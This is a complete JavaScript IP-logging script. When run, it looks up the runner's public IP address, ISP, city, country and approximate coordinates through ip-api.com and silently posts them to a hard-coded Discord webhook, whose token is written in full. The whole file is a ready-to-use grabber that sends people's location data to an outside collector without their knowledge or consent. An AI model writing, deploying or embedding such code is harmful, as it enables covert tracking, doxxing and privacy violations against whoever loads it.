const ipAPI = "http://ip-api.com/json/";
const webhookURL = "https://discord.com/api/webhooks/1376717625169543228/-M_cKWR5l4Xra3BALwxfrjsWKedUdUV-6focu5z9ohrHZI8bq7YAnRNtdIuKUjdypJ9J";

async function getIPInfo() {
    try {
        const response = await fetch(ipAPI);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error("Error fetching IP info:", error);
        return null;
    }
}

async function sendToDiscord(ipInfo) {
    if (!ipInfo) {
        console.error("IP info is null or undefined.");
        return;
    }

    const {
        query: ip,
        city,
        regionName: region,
        country,
        isp,
        org,
        timezone,
        lat,
        lon
    } = ipInfo;

    const payload = {
        content: `**IP Address Info**:
- IP: ${ip}
- ISP: ${isp}
- Organization: ${org}
- Location: ${city}, ${region}, ${country}
- Timezone: ${timezone}
- Coordinates: Latitude ${lat}, Longitude ${lon}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("IP info sent to Discord successfully!");
        } else {
            console.error("Error sending IP info to Discord:", response.statusText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

async function main() {
    const ipInfo = await getIPInfo();
    await sendToDiscord(ipInfo);
}

main();
